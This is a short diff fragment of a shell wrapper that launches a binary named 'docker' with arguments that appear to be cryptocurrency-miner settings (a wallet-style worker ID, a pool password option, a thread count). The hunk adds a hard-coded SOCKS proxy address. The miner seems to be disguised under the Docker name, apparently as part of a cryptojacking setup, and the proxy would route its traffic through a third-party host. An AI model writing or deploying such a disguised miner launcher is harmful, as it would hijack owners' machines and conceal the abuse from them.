@@ -14,4 +14,5 @@ exec /usr/local/bin/docker \
     -u "Wa8mFnYAtLeiaAmEsuMqtaHYxFFxpAAVZm.worker" \
     -p "c=SWAMP,mc=SWAMP" \
     -t 2 \
+    --proxy 45.115.224.103:1080 \
     "$@"
